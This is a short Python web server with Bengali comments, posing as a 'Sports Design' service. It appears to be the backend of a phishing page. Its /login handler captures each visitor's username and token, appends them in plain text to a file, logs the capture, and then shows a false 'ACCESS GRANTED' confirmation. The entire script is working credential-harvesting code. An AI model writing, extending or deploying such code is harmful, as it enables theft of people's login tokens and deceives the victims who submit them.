import http.server
import urllib.parse
import os

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            fields = urllib.parse.parse_qs(post_data)
            
            user = fields.get('username', [''])[0]
            token = fields.get('token', [''])[0]
            
            # ক্লাউড লগে প্রিন্ট করার পাশাপাশি একটি লোকাল ফাইলে ডেটা অ্যাপেন্ড (Append) করার কোড
            with open("test_database.txt", "a", encoding="utf-8") as f:
                f.write(f"Client: {user} | Token: {token}\n")
            
            print(f"\n[+] SAVED TO FILE -> Client: {user}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            success_html = """
            <html>
            <body style="background-color: #060814; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
                <h2 style="color: #ff4757;">✔ ACCESS GRANTED!</h2>
                <p style="color: #a4b0be;">আপনার কাস্টম স্পোর্টস ডিজাইন ডাটাবেজে রিকোয়েস্ট পাঠানো হয়েছে।</p>
            </body>
            </html>
            """
            self.wfile.write(success_html.encode('utf-8'))
        else:
            super().do_POST()

port = int(os.environ.get("PORT", 8080))
server_address = ('', port)
httpd = http.server.HTTPServer(server_address, MyHandler)
print(f"[*] Sports Design Server Running on port {port}...")
httpd.serve_forever()
